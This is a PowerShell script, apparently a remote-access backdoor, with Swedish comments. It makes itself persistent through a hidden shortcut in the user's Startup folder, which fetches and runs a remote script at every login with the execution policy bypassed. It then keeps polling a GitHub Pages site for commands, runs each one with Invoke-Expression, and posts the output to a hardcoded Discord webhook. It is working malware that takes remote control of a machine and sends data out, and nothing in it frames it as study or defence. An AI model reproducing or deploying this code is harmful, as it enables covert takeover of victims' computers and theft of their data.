function wb {
    param (
        $cont
    )

    # 1. Define your Discord Webhook URL
$WebhookUrl = "https://discord.com/api/webhooks/1536045344880722013/Qyor6OfSlhGoPOMcvH6mHQ8SVDSkVIPSYvyq7UA826FP9QVzmd4I1M34pk2BpMQNNXZ2"

# 2. Construct the message payload
$Payload = @{
    username   = "PowerShell Bot"
    avatar_url = "https://imgur.com" # Optional custom avatar
    content    = $cont
}

# 3. Convert payload to JSON formatting
$BodyJson = $Payload | ConvertTo-Json -Compress

# 4. Execute the API POST request
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $BodyJson -ContentType "application/json"

    
}


Write-Output "started"

# 1. Definiera namn och det kommando som ska köras
$TaskName = "UserLoginCommand"
$UserCommand = 'iex (irm "https://github.com/tabmper/tabmper.github.io/raw/refs/heads/main/main.ps1")'

# Hitta din personliga autostart-mapp (kräver INTE admin)
$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$ShortcutPath = Join-Path $StartupFolder "$TaskName.lnk"

try {
    # Kontrollera om genvägen redan finns
    if (Test-Path $ShortcutPath) {
        Write-Host "Genvägen '$TaskName' finns redan. Uppdaterar den nu..." -ForegroundColor Yellow
    } else {
        Write-Host "Skapar ny autostart-genväg för '$TaskName'..." -ForegroundColor Green
    }

    # 2. Skapa eller skriv över genvägen
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = "powershell.exe"
    
    # Skickar med ditt kommando så att det körs helt dolt i bakgrunden vid inloggning
    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$UserCommand`""
    $Shortcut.WindowStyle = 7 # Minimerat fönster för extra diskretion
    $Shortcut.Save()

    Write-Host "Success: Ditt GitHub-skript kommer nu att köras dolt varje gång du loggar in!" -ForegroundColor Green
} 
catch {
    Write-Host "Ett fel uppstod när genvägen skulle skapas: $_" -ForegroundColor Red
}

while ($true) {
    if (-not($html.p -eq $oldhtml.p)) {
        wb -cont (Invoke-Expression $html.p)
    }
    $oldhtml = $html
    $html = Invoke-RestMethod -uri "https://tabmper.github.io"
    Start-Sleep -seconds 10
}
